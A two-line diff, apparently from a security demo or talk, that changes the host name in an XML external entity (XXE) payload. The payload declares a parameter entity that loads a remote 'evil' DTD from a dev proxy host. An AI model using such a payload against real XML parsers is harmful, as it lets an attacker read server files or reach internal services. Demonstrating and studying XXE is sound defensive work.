@@ -1,2 +1,2 @@
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM
-"https://evildtd-magnus-foredrag-proxy.dev.radix.equinor.com"> %xxe;]>
+"https://evildtd-xxe-demo-proxy.dev.radix.equinor.com"> %xxe;]>
